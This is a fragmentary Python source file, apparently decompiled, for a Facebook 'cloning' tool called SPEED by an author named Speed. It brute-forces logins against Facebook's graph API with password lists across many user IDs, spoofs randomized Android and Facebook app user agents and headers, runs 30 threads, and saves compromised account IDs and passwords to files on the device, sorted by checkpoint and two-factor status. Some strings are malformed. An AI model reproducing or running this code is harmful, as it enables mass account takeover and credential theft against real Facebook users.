...
def uaku():
	try:
		...
		a=requests.get('https://github.com/larbihannachi24/Speed24.txt').text
		ua=open('.bbnew.txt','w')
...
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝
\x1b[1;91m---------------------------------------
\x1b[1;97m> Author : Speed
\x1b[1;97m> Github : https://github.com/larbihannachi24/Speed24
\x1b[1;97m> Facebok: Speed
...
def cloning_two():
  ...
  #  print(50*'-')
    ...
    os.system("clear")
    print(logo)
    print(' [•] Cloninging Limit : '+str(len(idx)))
    print(" [•] Be Patience Cloning Has Been Started")
  #  print("To stop process press CTRL c")
    ...
    def Speed(user):
        ...
        for px in pp:
            ...
            net = f'{random.randint(10,438)}.0.0.{random.randint(1,99)}.{random.randint(1,200)}'          
            ...
            uazz = f'[FBAN/MobileAdsManagerAndroid;FBAV/{net};FBPN/com.facebook.adsmanager;FBLC/en_US;FBBV/{fbbv};FBCR/null;FBMF/TECNO;FBBD/TECNO;FBDV/{poc};FBSV/12;FBCA/arm64-v8a;FBDM/'+'{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,1500))+',height='+str(random.randint(999,3000))+'};FBOP/1;]'
            ugm = f"[FBAN/FB4A;FBAV/"+net+".0.0.77.46;FBBV/251145743;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,1500))+',height='+str(random.randint(999,3000))+'};FBLC/pt_BR;FBRV/"+str(random.randint(000000000,999999999))+";FBCR/Zong;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/"+zov+";FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
            fbav = f'{random.randint(10,438)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(11111111,99999999))
            ...
            ua = 'Mozilla/5.0 (Linux; Android 13; CPH2359 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]'
          #  print (ua)
            teca = f'Mozilla/5.0 (Linux; Android 5.0.1; LG-D838 Build/LRX21Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36 {uazz}'
            header = {"User-Agent": "Mozilla/5.0 (Linux; Android "+vers+"; SM-G900V Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+chrm+".0."+chrrm+"."+chrmm+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+net+";]", "Content-Type": "application/x-www-form-urlencoded", "Host": "graph.facebook.com", "X-FB-Net-HNI": "22739", "X-FB-SIM-HNI": "35221", "X-FB-Connection-Type": "MOBILE.LTE", "X-Tigon-Is-Retry": "False", "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62", "x-fb-device-group": "5120", "X-FB-Friendly-Name": "ViewerReactionsMutation", "X-FB-Request-Analytics-Tags": "graphservice", "X-FB-HTTP-Engine": "Liger", "X-FB-Client-IP": "True", "X-FB-Server-Cluster": "True", "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"}
            ...
            if 'session_key' in response.text:
                print('\r{}\033[1;92m [SPEED-OK] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/SPEED/SPEED-OK.txt','a').write(f'{url}|{px}\n')
                oku.append(url)
                break
            elif 'checkpoint' in response.text:
                print('\r{}\033[1;91m[Checkpiont] {} {} {} {}'.format(G, url, fax, px, mys))
                cpu.append(url)
                open('/sdcard/SPEED/SPEED-CP.txt','a').write(f'{url}|{px}\n')
                break
            elif 'Login approvals are on' in response.text:
                print('\r{}\033[1;94m[2F-SPEED] {} {} {} {}'.format(G, url, fax, px, mys))
                open('/sdcard/SPEED/SPEED-2F.txt','a').write(f'{url}|{px}\n')
            else:
                #print(response.text)
                continue
        sys.stdout.write('\r{} [SPEED-XD] [{}|{}] [OK:{}] {}\r'.format(mys, str(loop), str(len(idx)), str(len(oku)) ,mys))
        sys.stdout.flush()
        loop += 1       
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Fadi:     
                        clear()
                        tl = str(len(user))
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m[SPEED-XD] [%s] [\033[1;37mOK : %s ] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                     ...
                     #   ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.75,width=720,height=1640};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        ...
                        headers={
                                ...
                                'User-Agent':"[Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/Orca-Android;FBAV/"+zomir+";FBPN/com.facebook.katana;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,1500))+',height='+str(random.randint(999,3000))+'};FB_FW/1;] FBBK/1]",
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SPEED-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SPEED/SPEED-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/SPEED/SPEED-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/SPEED.txt \033[0;97m\n')
...
def login():
    ...
    try:
        print('\n Validating cookies ... ')
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36', } (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
